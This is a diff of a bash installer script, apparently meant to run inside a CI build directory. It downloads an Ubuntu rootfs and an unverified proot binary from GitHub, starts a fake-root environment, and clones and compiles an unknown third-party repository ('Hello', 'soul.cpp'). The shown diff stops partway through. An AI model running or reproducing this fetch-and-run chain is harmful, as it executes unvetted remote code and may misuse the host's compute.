@@ -1,91 +1,70 @@
-#!/bin/sh
+#!/bin/bash
 
-ROOTFS_DIR=$(pwd)
-export PATH=$PATH:~/.local/usr/bin
+set -e  # Exit on error
+
+ROOTFS_DIR=${SCRUTINIZER_BUILD_DIR:-$(pwd)}
+export PATH="$PATH:$HOME/.local/usr/bin"
+
 max_retries=50
 timeout=1
 ARCH=$(uname -m)
 
 if [ "$ARCH" = "x86_64" ]; then
-  ARCH_ALT=amd64
+  ARCH_ALT="amd64"
 elif [ "$ARCH" = "aarch64" ]; then
-  ARCH_ALT=arm64
+  ARCH_ALT="arm64"
 else
-  printf "Unsupported CPU architecture: ${ARCH}"
+  echo "Unsupported CPU architecture: ${ARCH}"
   exit 1
 fi
 
-if [ ! -e $ROOTFS_DIR/.installed ]; then
+if [ ! -e "$ROOTFS_DIR/.installed" ]; then
   echo "#######################################################################################"
-  echo "#"
-  echo "#                                      Foxytoux INSTALLER"
-  echo "#"
-  echo "#                           Copyright (C) 2024, RecodeStudios.Cloud"
-  echo "#"
-  echo "#"
+  echo "#                                      Foxytoux INSTALLER                              #"
+  echo "#                           (C) 2024, RecodeStudios.Cloud                              #"
   echo "#######################################################################################"
-
   install_ubuntu="YES"
 fi
 
-case $install_ubuntu in
-  [yY][eE][sS])
-    wget --tries=$max_retries --timeout=$timeout --no-hsts -O /tmp/rootfs.tar.gz \
-      "http://cdimage.ubuntu.com/ubuntu-base/releases/20.04/release/ubuntu-base-20.04.4-base-${ARCH_ALT}.tar.gz"
-    tar -xf /tmp/rootfs.tar.gz -C $ROOTFS_DIR
-    ;;
-  *)
-    echo "Skipping Ubuntu installation."
-    ;;
-esac
+if [ "$install_ubuntu" = "YES" ]; then
+  wget --tries="$max_retries" --timeout="$timeout" --no-hsts -O /tmp/rootfs.tar.gz \
+    "http://cdimage.ubuntu.com/ubuntu-base/releases/20.04/release/ubuntu-base-20.04.4-base-${ARCH_ALT}.tar.gz" || { echo "Failed to download rootfs"; exit 1; }
 
-if [ ! -e $ROOTFS_DIR/.installed ]; then
-  mkdir $ROOTFS_DIR/usr/local/bin -p
-  wget --tries=$max_retries --timeout=$timeout --no-hsts -O $ROOTFS_DIR/usr/local/bin/proot "https://raw.githubusercontent.com/foxytouxxx/freeroot/main/proot-${ARCH}"
-
-  while [ ! -s "$ROOTFS_DIR/usr/local/bin/proot" ]; do
-    rm $ROOTFS_DIR/usr/local/bin/proot -rf
-    wget --tries=$max_retries --timeout=$timeout --no-hsts -O $ROOTFS_DIR/usr/local/bin/proot "https://raw.githubusercontent.com/foxytouxxx/freeroot/main/proot-${ARCH}"
-
-    if [ -s "$ROOTFS_DIR/usr/local/bin/proot" ]; then
-      chmod 755 $ROOTFS_DIR/usr/local/bin/proot
-      break
-    fi
-
-    chmod 755 $ROOTFS_DIR/usr/local/bin/proot
-    sleep 1
-  done
-
-  chmod 755 $ROOTFS_DIR/usr/local/bin/proot
+  tar -xf /tmp/rootfs.tar.gz -C "$ROOTFS_DIR"
 fi
 
-if [ ! -e $ROOTFS_DIR/.installed ]; then
-  printf "nameserver 1.1.1.1\nnameserver 1.0.0.1" > ${ROOTFS_DIR}/etc/resolv.conf
-  rm -rf /tmp/rootfs.tar.xz /tmp/sbin
-  touch $ROOTFS_DIR/.installed
+if [ ! -e "$ROOTFS_DIR/.installed" ]; then
+  mkdir -p "$ROOTFS_DIR/usr/local/bin"
+
+  wget --tries="$max_retries" --timeout="$timeout" --no-hsts -O "$ROOTFS_DIR/usr/local/bin/proot" \
+    "https://raw.githubusercontent.com/foxytouxxx/freeroot/main/proot-${ARCH}" || { echo "Failed to download proot"; exit 1; }
+
+  chmod 755 "$ROOTFS_DIR/usr/local/bin/proot"
+fi
+
+if [ ! -e "$ROOTFS_DIR/.installed" ]; then
+  echo -e "nameserver 1.1.1.1\nnameserver 1.0.0.1" > "${ROOTFS_DIR}/etc/resolv.conf"
+  rm -rf /tmp/rootfs.tar.gz /tmp/sbin
+  touch "$ROOTFS_DIR/.installed"
 fi
 
 CYAN='\e[0;36m'
 WHITE='\e[0;37m'
 RESET_COLOR='\e[0m'
 
-display_gg() {
+display_success() {
   echo -e "${WHITE}___________________________________________________${RESET_COLOR}"
-  echo -e ""
-  echo -e "           ${CYAN}-----> Mission Completed ! <----${RESET_COLOR}"
+  echo -e "           ${CYAN}-----> Mission Completed! <----${RESET_COLOR}"
 }
 
 clear
-display_gg
+display_success
 
-$ROOTFS_DIR/usr/local/bin/proot \
-  --rootfs="${ROOTFS_DIR}" \
+"$ROOTFS_DIR/usr/local/bin/proot" \
+  --rootfs="$ROOTFS_DIR" \
   -0 -w "/root" -b /dev -b /sys -b /proc -b /etc/resolv.conf --kill-on-exit \
   /bin/sh -c "apt update && \
-  apt install sudo -y && \
-  apt install python3-pip -y && \
-  apt install git -y && \
-  apt install ufw -y && \
+  apt install -y sudo python3-pip git ufw && \
   git clone https://github.com/bool-anony1764/Hello && \
   cd Hello && \
   g++ -std=c++14 soul.cpp -o soul -pthread && \
